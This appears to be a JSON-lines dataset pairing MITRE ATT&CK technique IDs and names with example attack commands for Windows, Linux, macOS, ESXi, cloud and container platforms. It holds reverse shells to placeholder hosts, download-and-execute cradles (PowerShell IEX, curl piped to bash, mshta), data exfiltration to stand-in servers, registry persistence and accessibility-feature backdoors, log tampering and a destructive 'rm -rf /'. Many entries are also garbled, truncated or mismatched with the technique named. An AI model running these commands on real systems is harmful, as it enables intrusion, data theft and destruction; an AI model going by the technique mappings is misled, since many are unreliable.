+{"mitre_id": "T1054", "name": "Indicator Blocking", "platform": "Windows", "command": "Get-WinEvent -FilterHashtable @{Logname=\"Security\"} | Where-Object {$_.Id -ne 4624} | Stop-EventLog"}
+{"mitre_id": "T1598.004", "name": "Spearphishing Voice", "platform": "PRE", "command": "`pre-execute -t spearphishing_voice`"}
+{"mitre_id": "T1108", "name": "Redundant Access", "platform": "Windows", "command": "net user /add \"adversary_account\" /localgroup \"Remote Access\""}
+{"mitre_id": "T1193", "name": "Spearphishing Attachment", "platform": "Windows", "command": "`powershell -Command \"Invoke-Item (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.exe')\""}
+{"mitre_id": "T1003.005", "name": "Cached Domain Credentials", "platform": "Windows", "command": "secretsdump.py -sam -h <domain_controller_ip>"}
+{"mitre_id": "T1098.004", "name": "SSH Authorized Keys", "platform": "Linux", "command": "echo'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> ~/.ssh/authorized_keys"}
+{"mitre_id": "T1673", "name": "Virtual Machine Discovery", "platform": "ESXi", "command": "esxcli vm process list"}
+{"mitre_id": "T1215", "name": "Kernel Modules and Extensions", "platform": "Linux", "command": "modprobe <module_name>"}
+{"mitre_id": "T1101", "name": "Security Support Provider", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\" /v \"MySSP\" /t REG_SZ /d \"C:\\Path\\To\\MySSP.dll\" /f"}
+{"mitre_id": "T1590.006", "name": "Network Security Appliances", "platform": "PRE", "command": "nmap -sV -A <target_IP>"}
+{"mitre_id": "T1546.012", "name": "Image File Execution Options Injection", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe\" /v Debugger /t REG_SZ /d \"C:\\path\\to\\malicious\\program.exe\" /f"}
+{"mitre_id": "T1218.008", "name": "Odbcconf", "platform": "Windows", "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}"}
+{"mitre_id": "T1593.002", "name": "Search Engines", "platform": "PRE", "command": "site:.gov intitle:\"password\""}
+{"mitre_id": "T1177", "name": "LSASS Driver", "platform": "Windows", "command": "wmic process where \"name='lsass.exe'\" call terminate"}
+{"mitre_id": "T1591.002", "name": "Business Relationships", "platform": "PRE", "command": "python social_media_monitoring.py"}
+{"mitre_id": "T1548.005", "name": "Temporary Elevated Cloud Access", "platform": "IaaS", "command": "aws iam create-service-linked-role --aws-service-name configservice.amazonaws.com"}
+{"mitre_id": "T1125", "name": "Video Capture", "platform": "Windows", "command": "wmic /output:C:\\output.txt process where \"imagename like \"%Camera%\" or \"imagename like \"%Skype%\"\""}
+{"mitre_id": "T1144", "name": "Gatekeeper Bypass", "platform": "macOS", "command": "sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app"}
+{"mitre_id": "T1045", "name": "Software Packing", "platform": "Windows", "command": "`upx -9 --lzma --best example.exe`"}
+{"mitre_id": "T1055.013", "name": "Process Doppelgänging", "platform": "Windows", "command": "`CreateTransaction`"}
+{"mitre_id": "T1016", "name": "System Network Configuration Discovery", "platform": "ESXi", "command": "esxcli network ip interface ipv4 get"}
+{"mitre_id": "T1578.003", "name": "Delete Cloud Instance", "platform": "IaaS", "command": "aws ec2 terminate-instances --instance-ids i-0123456789abcdef0"}
+{"mitre_id": "T1593.003", "name": "Code Repositories", "platform": "PRE", "command": "git clone https://github.com/user/repository.git"}
+{"mitre_id": "T1574.005", "name": "Executable Installer File Permissions Weakness", "platform": "Windows", "command": "icacls \"C:\\path\\to\\installer.exe\" /inheritance:e"}
+{"mitre_id": "T1546.008", "name": "Accessibility Features", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\""}
+{"mitre_id": "T1496.002", "name": "Bandwidth Hijacking", "platform": "Linux", "command": "`nmap -sS -Pn -p 1-65535 -oN output.txt 192.168.1.0/24`"}
+{"mitre_id": "T1504", "name": "PowerShell Profile", "platform": "Windows", "command": "New-Item -Path $env:USERPROFILE\\Documents\\WindowsPowerShell\\profile.ps1 -ItemType File -Value \"Invoke-Command -ScriptBlock {Start-Process -FilePath 'C:\\path\\to\\malicious\\executable.exe'}\""}
+{"mitre_id": "T1198", "name": "SIP and Trust Provider Hijacking", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}\" /v Dll /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1087", "name": "Account Discovery", "platform": "ESXi", "command": "esxcli auth user-list"}
+{"mitre_id": "T1090", "name": "Proxy", "platform": "ESXi", "command": "esxcli network ip route add -p 10.0.0.1/32 -g 192.168.1.100"}
+{"mitre_id": "T1059", "name": "Command and Scripting Interpreter", "platform": "ESXi", "command": "vmware-cmd -g /vmfs/volumes/ -h -u root"}
+{"mitre_id": "T1204.005", "name": "Malicious Library", "platform": "Linux", "command": "`pip install -U --force-reinstall 'package_name'`"}
+{"mitre_id": "T1562.006", "name": "Indicator Blocking", "platform": "Windows", "command": "Set-EtwTraceProvider -ProviderGuid {your_guid} -ProviderId 0 -EnableProvider $false"}
+{"mitre_id": "T1136.002", "name": "Domain Account", "platform": "Linux", "command": "net user /add /domain"}
+{"mitre_id": "T1564.014", "name": "Extended Attributes", "platform": "Linux", "command": "setfattr -n user.test -v \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"}
+{"mitre_id": "T1589.003", "name": "Employee Names", "platform": "PRE", "command": "python social_engineering/social_media_scraping/social_media_scraping.py"}
+{"mitre_id": "T1677", "name": "Poisoned Pipeline Execution", "platform": "SaaS", "command": "```yml\nname: Malicious Pipeline\non:\n  pull_request:\n    paths:\n      - 'path/to/malicious/file.py'\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n      - name: Run malicious code\n        run: python path/to/malicious/file.py\n```"}
+{"mitre_id": "T1482", "name": "Domain Trust Discovery", "platform": "Windows", "command": "nltest /domain_trusts"}
+{"mitre_id": "T1558.001", "name": "Golden Ticket", "platform": "Windows", "command": "klist /kptgt"}
+{"mitre_id": "T1175", "name": "Component Object Model and Distributed COM", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\" /ve /t REG_SZ /d \"Malicious DLL Path\""}
+{"mitre_id": "T1020", "name": "Automated Exfiltration", "platform": "Linux", "command": "`rsync -avz -e ssh /path/to/sensitive/documents user@exfiltration_server:/path/to/exfiltration/location`"}
+{"mitre_id": "T1592.004", "name": "Client Configurations", "platform": "PRE", "command": "netsh winsock show"}
+{"mitre_id": "T1562.007", "name": "Disable or Modify Cloud Firewall", "platform": "IaaS", "command": "aws ec2 create-security-group --description \"Allow all TCP/IP connectivity\" --group-name \"malicious-traffic\" --vpc-id \"vpc-12345678\""}
+{"mitre_id": "T1219.001", "name": "IDE Tunneling", "platform": "Linux", "command": "code-server --auth none --port 8080 --bind-address 0.0.0.0"}
+{"mitre_id": "T1036.002", "name": "Right-to-Left Override", "platform": "Linux", "command": "ls -l \\u202Efile.txt"}
+{"mitre_id": "T1588.001", "name": "Malware", "platform": "PRE", "command": "`powershell -Command \"Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\malware.exe\"`"}
+{"mitre_id": "T1027.017", "name": "SVG Smuggling", "platform": "Linux", "command": "`echo '<svg><script>alert(\"SVG Smuggling Test\");</script></svg>' > malicious.svg`"}
+{"mitre_id": "T1542.002", "name": "Component Firmware", "platform": "Windows", "command": "bcdedit /set {current} bootsequence multi(0)disk(1)rdisk(0)partition(1)\\Windows\\bootmgr.exe"}
+{"mitre_id": "T1070", "name": "Indicator Removal", "platform": "Containers", "command": "docker rm $(docker ps -a -q)"}
+{"mitre_id": "T1048.001", "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "platform": "Linux", "command": "`nc -e /bin/bash -lvp 443 -c 'cat /etc/passwd'`"}
+{"mitre_id": "T1137.001", "name": "Office Template Macros", "platform": "Windows", "command": "`reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Settings\" /v GlobalDotName /t REG_SZ /d \"C:\\path\\to\\malicious\\template.dotm\"`"}
+{"mitre_id": "T1583.003", "name": "Virtual Private Server", "platform": "PRE", "command": "aws ec2 run-instances --image-id ami-0c55b159cbff415be --count 1 --instance-type t2.micro"}
+{"mitre_id": "T1213.001", "name": "Confluence", "platform": "SaaS", "command": "confluence.search(\"credentials\")"}
+{"mitre_id": "T1550.003", "name": "Pass the Ticket", "platform": "Windows", "command": "klist tgt /s <target_machine_name>"}
+{"mitre_id": "T1609", "name": "Container Administration Command", "platform": "Containers", "command": "docker exec -it <container_id> /bin/bash"}
+{"mitre_id": "T1083", "name": "File and Directory Discovery", "platform": "ESXi", "command": "esxcli storage filesystem list"}
+{"mitre_id": "T1568", "name": "Dynamic Resolution", "platform": "Linux", "command": "`dig +short myip.opendns.com @resolver1.opendns.com`"}
+{"mitre_id": "T1036.004", "name": "Masquerade Task or Service", "platform": "Linux", "command": "systemctl start /usr/lib/systemd/system/ssh.service"}
+{"mitre_id": "T1055.004", "name": "Asynchronous Procedure Call", "platform": "Windows", "command": "QueueUserAPC(0xfeeefeee, (LPVOID)0x12345678, (PVOID)0x12345678)"}
+{"mitre_id": "T1020.001", "name": "Traffic Duplication", "platform": "Network Devices", "command": "`show run | include \"mirror\" | include \"session\"`"}
+{"mitre_id": "T1138", "name": "Application Shimming", "platform": "Windows", "command": "sdbinst.exe -o -s %WINDIR%\\AppPatch\\sysmain.sdb"}
+{"mitre_id": "T1647", "name": "Plist File Modification", "platform": "macOS", "command": "defaults write ~/Library/Preferences/com.apple.dock.plist launch-agent \"/path/to/malicious/script\""}
+{"mitre_id": "T1127.003", "name": "JamPlus", "platform": "Windows", "command": "`jamplus /build malicious_script.jam`"}
+{"mitre_id": "T1546.009", "name": "AppCert DLLs", "platform": "Windows", "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" /v AppCertDLLs /t REG_SZ /d \"path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1191", "name": "CMSTP", "platform": "Windows", "command": "CMSTP.exe /inf=\"path\\to\\malicious.inf\""}
+{"mitre_id": "T1188", "name": "Multi-hop Proxy", "platform": "Linux", "command": "`sudo apt-get install squid && sudo squid -f /etc/squid/squid.conf`"}
+{"mitre_id": "T1114.003", "name": "Email Forwarding Rule", "platform": "Linux", "command": "`echo \"set +o pipefail && echo \"rulehead\" | mail -r \"adversary@example.com\" -s \"Test Email\" example@example.com`"}
+{"mitre_id": "T1074", "name": "Data Staged", "platform": "Windows", "command": "copy C:\\path\\to\\staged_data.txt C:\\path\\to\\staging\\location\\staged_data.txt"}
+{"mitre_id": "T1649", "name": "Steal or Forge Authentication Certificates", "platform": "Windows", "command": "certutil.exe -key -v -f -k \"*\\*\"."}
+{"mitre_id": "T1098.005", "name": "Device Registration", "platform": "Windows", "command": "net user /add \"adversary-controlled-device\" \"adversary-controlled-password\""}
+{"mitre_id": "T1049", "name": "System Network Connections Discovery", "platform": "Windows", "command": "netstat -an"}
+{"mitre_id": "T1584", "name": "Compromise Infrastructure", "platform": "PRE", "command": "nmap -sS -Pn -p 1-65535 192.168.1.0/24"}
+{"mitre_id": "T1553.005", "name": "Mark-of-the-Web Bypass", "platform": "Windows", "command": "attrib -r -s -h \"C:\\path\\to\\container_file.arj\""}
+{"mitre_id": "T1600.002", "name": "Disable Crypto Hardware", "platform": "Network Devices", "command": "`no ip igmp snooping`"}
+{"mitre_id": "T1542", "name": "Pre-OS Boot", "platform": "Linux", "command": "`sudo mokutil --disable-validation`"}
+{"mitre_id": "T1064", "name": "Scripting", "platform": "Linux", "command": "python -c 'import os; os.system(\"bash -c \\\\\"rm -rf /\\\\\")'"}
+{"mitre_id": "T1612", "name": "Build Image on Host", "platform": "Containers", "command": "docker build -t myimage."}
+{"mitre_id": "T1051", "name": "Shared Webroot", "platform": "Windows", "command": "net share webroot=\"C:\\inetpub\\wwwroot\" /grant:everyone,full"}
+{"mitre_id": "T1055.002", "name": "Portable Executable Injection", "platform": "Windows", "command": "`CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)address_of_code, NULL, 0, NULL)`"}
+{"mitre_id": "T1218.012", "name": "Verclsid", "platform": "Windows", "command": "verclsid.exe /S /C {CLSID}"}
+{"mitre_id": "T1586", "name": "Compromise Accounts", "platform": "PRE", "command": "python social_engineering.py"}
+{"mitre_id": "T1569.001", "name": "Launchctl", "platform": "macOS", "command": "launchctl load -w \"/Library/LaunchAgents/ malicious.agent.plist\""}
+{"mitre_id": "T1584.005", "name": "Botnet", "platform": "PRE", "command": "python -c 'import socket,subprocess; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",1234)); subprocess.call([\"/bin/sh\",\"-c\",\"whoami\"])'"}
+{"mitre_id": "T1059.008", "name": "Network Device CLI", "platform": "Network Devices", "command": "`show run`"}
+{"mitre_id": "T1552.003", "name": "Shell History", "platform": "Linux", "command": "history -c"}
+{"mitre_id": "T1562.010", "name": "Downgrade Attack", "platform": "Windows", "command": "powershell -Command \"Set-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\ScriptedGroupPolicy' -Name 'DisableWindowsUpdate' -Value 1\""}
+{"mitre_id": "T1559.003", "name": "XPC Services", "platform": "macOS", "command": "xpc_service -l -p com.apple.xpc.launchd -s com.apple.xpc.launchd -x /path/to/malicious/content"}
+{"mitre_id": "T1497", "name": "Virtualization/Sandbox Evasion", "platform": "Linux", "command": "`ps aux | grep -q vmware || sleep 300 && exit`"}
+{"mitre_id": "T1102", "name": "Web Service", "platform": "ESXi", "command": "esxcli network firewall ruleset -a 0 -r 80 -p tcp -d 8.8.8.8"}
+{"mitre_id": "T1552.001", "name": "Credentials In Files", "platform": "Containers", "command": "docker exec -it <container_id> cat /path/to/credentials/file"}
+{"mitre_id": "T1568.003", "name": "DNS Calculation", "platform": "Linux", "command": "dig +short example.com | awk '{print $4}' | cut -d '.' -f 1-3 | awk '{print $1\".\"$2\".\"$3\".80\"}'"}
+{"mitre_id": "T1218.005", "name": "Mshta", "platform": "Windows", "command": "mshta vbscript:Close(Execute(\"GetObject(\"\"http[:]//webserver/payload.sct\"\")\"))"}
+{"mitre_id": "T1547.015", "name": "Login Items", "platform": "macOS", "command": "tell application \"System Events\" to make login item at end with properties {name:\"Malicious Executable\", path:\"/path/to/executable\"}"}
+{"mitre_id": "T1608", "name": "Stage Capabilities", "platform": "PRE", "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"name\": \"capability\", \"type\": \"web\", \"url\": \"https://example.com/capability.js\"}' https://pre.com/api/stage/capability"}
+{"mitre_id": "T1608.005", "name": "Link Target", "platform": "PRE", "command": "`curl -s https://example.com/phishing-page`"}
+{"mitre_id": "T1104", "name": "Multi-Stage Channels", "platform": "Linux", "command": "`nc -e /bin/bash 10.0.0.1 443`"}
+{"mitre_id": "T1657", "name": "Financial Theft", "platform": "Linux", "command": "`ssh user@victim_linux 'echo \"bash -c 'cat /etc/passwd | mail -s \"You owe me money\" attacker_email@example.com'\"'`"}
+{"mitre_id": "T1480", "name": "Execution Guardrails", "platform": "ESXi", "command": "esxcli vm process list | grep -i \"your_target_vm_name\""}
+{"mitre_id": "T1619", "name": "Cloud Storage Object Discovery", "platform": "IaaS", "command": "aws cloudwatch logs get-log-events --start-time 2022-01-01 --end-time 2022-12-31 --filter-name \"s3:*\""}
+{"mitre_id": "T1606.001", "name": "Web Cookies", "platform": "Linux", "command": "`python -c 'import requests; s = requests.Session(); s.cookies[\"session_id\"] = \"adversary_generated_cookie_value\"; s.get(\"http://target_website.com\")'"}
+{"mitre_id": "T1654", "name": "Log Enumeration", "platform": "ESXi", "command": "esxcli system logs dump"}
+{"mitre_id": "T1134.001", "name": "Token Impersonation/Theft", "platform": "Windows", "command": "DuplicateTokenEx(NULL, NULL, NULL, 0x0002, &hToken);"}
+{"mitre_id": "T1567.001", "name": "Exfiltration to Code Repository", "platform": "Linux", "command": "curl -X POST -H \"Authorization: Bearer YOUR_TOKEN\" -H \"Content-Type: application/json\" -d '{\"name\": \"exfiltrated_data\", \"content\": \"base64 encoded data\"}' https://api.github.com/repos/username/repository/contents/path/to/exfiltrated/data"}
+{"mitre_id": "T1021.007", "name": "Cloud Services", "platform": "IaaS", "command": "az login"}
+{"mitre_id": "T1205.001", "name": "Port Knocking", "platform": "Linux", "command": "nc -l -p 1234"}
+{"mitre_id": "T1027.012", "name": "LNK Icon Smuggling", "platform": "Windows", "command": "cmd /c \"powershell -c \"Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe; Start-Process -FilePath C:\\Windows\\Temp\\malware.exe\"\""}
+{"mitre_id": "T1583.006", "name": "Web Services", "platform": "PRE", "command": "python -m pip install --upgrade requests"}
+{"mitre_id": "T1528", "name": "Steal Application Access Token", "platform": "SaaS", "command": "az ad app create-for-azure-web --name \"malicious-app\" --reply-url \"https://example.com/callback\" --required-resource-access \"https://graph.microsoft.com/.default\""}
+{"mitre_id": "T1598.002", "name": "Spearphishing Attachment", "platform": "PRE", "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/malicious.exe' -OutFile C:\\Users\\username\\Downloads\\malicious.exe\""}
+{"mitre_id": "T1098.001", "name": "Additional Cloud Credentials", "platform": "IaaS", "command": "gcloud iam service-accounts keys create"}
+{"mitre_id": "T1204", "name": "User Execution", "platform": "Linux", "command": "`bash /path/to/malicious/script.sh`"}
+{"mitre_id": "T1491.001", "name": "Internal Defacement", "platform": "ESXi", "command": "`esxcli system shutdown poweroff`"}
+{"mitre_id": "T1564.002", "name": "Hidden Users", "platform": "macOS", "command": "sudo defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool true"}
+{"mitre_id": "T1134.003", "name": "Make and Impersonate Token", "platform": "Windows", "command": "`LogonUserW(\"username\", NULL, \"password\", 3, 0, NULL, &tokenHandle)`"}
+{"mitre_id": "T1552.006", "name": "Group Policy Preferences", "platform": "Windows", "command": "dir /s *.xml"}
+{"mitre_id": "T1196", "name": "Control Panel Items", "platform": "Windows", "command": "control.exe /s /c \"c:\\path\\to\\malicious.cpl\""}
+{"mitre_id": "T1048.002", "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "platform": "Linux", "command": "openssl s_client -connect example.com:443 -cipher \"ECDHE-RSA-AES256-GCM-SHA384\""}
+{"mitre_id": "T1087.004", "name": "Cloud Account", "platform": "IaaS", "command": "az vm list"}
+{"mitre_id": "T1057", "name": "Process Discovery", "platform": "ESXi", "command": "esxcli system process list"}
+{"mitre_id": "T1562.003", "name": "Impair Command History Logging", "platform": "ESXi", "command": "unset HISTFILE"}
+{"mitre_id": "T1053.004", "name": "Launchd", "platform": "macOS", "command": "launchctl load -w /Library/LaunchDaemons/malicious.plist"}
+{"mitre_id": "T1556.008", "name": "Network Provider DLL", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"mpnotify\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1546.003", "name": "Windows Management Instrumentation Event Subscription", "platform": "Windows", "command": "wmic path win32_process where \"name='wmiPrvSe.exe'\" call terminate"}
+{"mitre_id": "T1596.004", "name": "CDNs", "platform": "PRE", "command": "nmap -sV -A -p 80,443 -oN cdn_scan.txt example.com"}
+{"mitre_id": "T1497.002", "name": "User Activity Based Checks", "platform": "Linux", "command": "`ps -ef | grep -q \"vmware\" && echo \"VME detected\"`"}
+{"mitre_id": "T1141", "name": "Input Prompt", "platform": "macOS", "command": "osascript -e 'display dialog \"Enter your password\" default answer \"\" with icon alert buttons {\"Cancel\", \"OK\"}'"}
+{"mitre_id": "T1496.004", "name": "Cloud Service Hijacking", "platform": "SaaS", "command": "aws sns publish --message \"Your account has been compromised\" --topic-arn arn:aws:sns:us-east-1:123456789012:my-topic"}
+{"mitre_id": "T1585.003", "name": "Cloud Accounts", "platform": "PRE", "command": "aws iam create-user --user-name \"adversary_account\""}
+{"mitre_id": "T1072", "name": "Software Deployment Tools", "platform": "Linux", "command": "sudo apt-get install -y curl && curl -s https://example.com/malicious_script.sh | bash"}
+{"mitre_id": "T1041", "name": "Exfiltration Over C2 Channel", "platform": "ESXi", "command": "vmware.esxcli.network.ip.set --ip=192.168.1.100 --netmask=255.255.255.0 --gateway=192.168.1.1 --dns-server1=192.168.1.1 --dns-server2=8.8.8.8"}
+{"mitre_id": "T1134.004", "name": "Parent PID Spoofing", "platform": "Windows", "command": "CreateProcessW(0x41414141, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, 0x41414141, NULL, NULL, CREATE_SUSPENDED, NULL, NULL)"}
+{"mitre_id": "T1591", "name": "Gather Victim Org Information", "platform": "PRE", "command": "python social_media_scanner.py -t \"company_name\""}
+{"mitre_id": "T1060", "name": "Registry Run Keys / Startup Folder", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Malware\" /t REG_SZ /d \"C:\\path\\to\\malware.exe\""}
+{"mitre_id": "T1606", "name": "Forge Web Credentials", "platform": "SaaS", "command": "python forge_web_credentials.py --target https://example.com --username admin --password P@ssw0rd"}
+{"mitre_id": "T1621", "name": "Multi-Factor Authentication Request Generation", "platform": "Windows", "command": "`powershell -c \"Add-Type -AssemblyName PresentationCore; $w = [Windows.Forms.MessageBox]; $w.Show('This is a test message for MFA request')\"`"}
+{"mitre_id": "T1554", "name": "Compromise Host Software Binary", "platform": "Linux", "command": "`yum versionlock <binary_name>`"}
+{"mitre_id": "T1552.008", "name": "Chat Messages", "platform": "SaaS", "command": "`Get-Content -Path \"C:\\Users\\username\\AppData\\Local\\Microsoft\\Teams\\cache\\index.vdb\"`"}
+{"mitre_id": "T1059.001", "name": "PowerShell", "platform": "Windows", "command": "IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malicious.ps1'); IEX."}
+{"mitre_id": "T1023", "name": "Shortcut Modification", "platform": "Windows", "command": "mklink \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shortcut.lnk\" \"C:\\path\\to\\malware.exe\""}
+{"mitre_id": "T1546.001", "name": "Change Default File Association", "platform": "Windows", "command": "reg add \"HKEY_CLASSES_ROOT\\.txt\" /v /f /t REG_SZ /d \"C:\\path\\to\\malicious\\program.exe %1\""}
+{"mitre_id": "T1055.014", "name": "VDSO Hijacking", "platform": "Linux", "command": "`ptrace(2) - attach to a process, then `syscall(2) - invoke a system call, then `mmap(2) - map a file into memory, then `mprotect(2) - modify memory protection, then `execve(2) - execute a program, then `ptrace(2) - detach from the process`"}
+{"mitre_id": "T1026", "name": "Multiband Communication", "platform": "Linux", "command": "`nc -e /bin/bash 10.0.0.1 443 10.0.0.2 80`"}
+{"mitre_id": "T1071.002", "name": "File Transfer Protocols", "platform": "ESXi", "command": "`esxcli network ip interface ipv4 set -p <interface> -d <ip> -g <gateway> -m <subnetmask>`"}
+{"mitre_id": "T1679", "name": "Selective Exclusion", "platform": "Windows", "command": "`cipher /d /v:C:\\Windows\\System32\\*.dll`"}
+{"mitre_id": "T1122", "name": "Component Object Model Hijacking", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{00021401-0000-0000-C000-000000000046}\" /ve /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"mitre_id": "T1015", "name": "Accessibility Features", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Debugger\" /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"}
+{"mitre_id": "T1212", "name": "Exploitation for Credential Access", "platform": "Linux", "command": "`nmap -sC -p 88`"}
+{"mitre_id": "T1546.014", "name": "Emond", "platform": "macOS", "command": "launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist"}
+{"mitre_id": "T1102.003", "name": "One-Way Communication", "platform": "Linux", "command": "`curl -s -X POST -d \"command_to_execute\" https://example.com/command`"}
+{"mitre_id": "T1590", "name": "Gather Victim Network Information", "platform": "PRE", "command": "nmap -sS -O 192.168.1.0/24"}
+{"mitre_id": "T1210", "name": "Exploitation of Remote Services", "platform": "Linux", "command": "nmap -sC -p 445 192.168.1.0/24"}
+{"mitre_id": "T1502", "name": "Parent PID Spoofing", "platform": "Windows", "command": "CreateProcessA(0, \"C:\\\\path\\\\to\\\\malicious.exe\", NULL, 0, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, NULL)"}
+{"mitre_id": "T1142", "name": "Keychain", "platform": "macOS", "command": "security unlock -v ~/Library/Keychains/login.keychain"}
+{"mitre_id": "T1534", "name": "Internal Spearphishing", "platform": "Windows", "command": "wmic /node:\"<target_computer_name>\" process where \"imagepath='C:\\\\Windows\\\\System32\\\\cmd.exe'\" call create \"cmd.exe /c \"powershell -c \"Invoke-WebRequest -Uri 'http://<attacker_server>/malicious_file.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\malicious_file.exe'; Start-Process 'C:\\\\Windows\\\\Temp\\\\malicious_file.exe'\" \"\""}
+{"mitre_id": "T1169", "name": "Sudo", "platform": "Linux", "command": "visudo 'user1 ALL=(ALL) NOPASSWD: ALL'"}
+{"mitre_id": "T1574.010", "name": "Services File Permissions Weakness", "platform": "Windows", "command": "icacls C:\\Windows\\System32\\svchost.exe /inheritance:e"}
+{"mitre_id": "T1547.001", "name": "Registry Run Keys / Startup Folder", "platform": "Windows", "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousProgram\" /t REG_SZ /d \"C:\\path\\to\\malicious\\program.exe\""}
+{"mitre_id": "T1199", "name": "Trusted Relationship", "platform": "Windows", "command": "net localgroup \"Remote Desktop Users\" /add \"username\""}
+{"mitre_id": "T1136.003", "name": "Cloud Account", "platform": "IaaS", "command": "az vm create --name myvm --resource-group myrg --image UbuntuServer --admin-username azureuser --admin-password P@ssw0rd123 --size Standard_DS2_v2 --location westus2 --identity type=\"SystemAssigned\" --identity-admin-username azureuser --identity-admin-password P@ssw0rd123 --identity-role \"Azure Built-in Role;Contributor\""}
+{"mitre_id": "T1069.001", "name": "Local Groups", "platform": "Linux", "command": "groups"}
+{"mitre_id": "T1149", "name": "LC_MAIN Hijacking", "platform": "macOS", "command": "otool -l --all --arch=x86_64 malicious_binary | grep LC_MAIN | awk '{print $1}' | sed's/LC_MAIN/0x20000000/' | xcrun -l -arch x86_64 -o modified_binary -segname __TEXT -segaddr 0x10000000 -seglen 0x10000000 -segname __LINKEDIT -segaddr 0x20000000 -seglen 0x10000000 -segname __TEXT -segaddr 0x30000000 -seglen 0x10000000 -segname"}
+{"mitre_id": "T1593", "name": "Search Open Websites/Domains", "platform": "PRE", "command": "site:*.com intitle:\"contact\""}
+{"mitre_id": "T1562.013", "name": "Disable or Modify Network Device Firewall", "platform": "Network Devices", "command": "`show firewall`"}
+{"mitre_id": "T1098", "name": "Account Manipulation", "platform": "Containers", "command": "`docker run -it --rm -v /:/host-system --privileged -e \"USER=root\" -e \"HOME=/root\" -e \"SHELL=/bin/bash\" -e \"PATH=/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" -e \"LD_LIBRARY_PATH=/lib:/usr/lib\" -e \"PYTHONPATH=/usr/lib/python3.9/site-packages\" -e \"PYTHONUNBUFFERED=1\" -e \"TERM=xterm\" -e \"TERM_PROGRAM=xterm\" -e \"TERM_PROGRAM_PATH=/usr/bin/xterm\" -e"}
+{"mitre_id": "T1170", "name": "Mshta", "platform": "Windows", "command": "mshta http://example.com/payload.hta"}
+{"mitre_id": "T1048", "name": "Exfiltration Over Alternative Protocol", "platform": "ESXi", "command": "curl -o /tmp/exfiltrated_data.txt http://<IP_address>/exfiltrated_data"}
+{"mitre_id": "T1547.006", "name": "Kernel Modules and Extensions", "platform": "macOS", "command": "kextload"}
+{"mitre_id": "T1678", "name": "Delay Execution", "platform": "Linux", "command": "`sleep 10`"}
+{"mitre_id": "T1056.002", "name": "GUI Input Capture", "platform": "macOS", "command": "osascript -e 'display dialog \"Enter your password\" default answer \"\" with icon alert buttons {\"Cancel\", \"OK\"}'"}
+{"mitre_id": "T1097", "name": "Pass the Ticket", "platform": "Windows", "command": "klist /s <target_computer_name>"}
+{"mitre_id": "T1588.002", "name": "Tool", "platform": "PRE", "command": "`powershell -c \"Invoke-WebRequest -Uri https://example.com/tool.exe -OutFile C:\\temp\\tool.exe\"`"}
+{"mitre_id": "T1052.001", "name": "Exfiltration over USB", "platform": "Linux", "command": "`lsusb`"}
+{"mitre_id": "T1574.013", "name": "KernelCallbackTable", "platform": "Windows", "command": "NtQueryInformationProcess(0x1F, 0x10, 0, 0, 0)"}
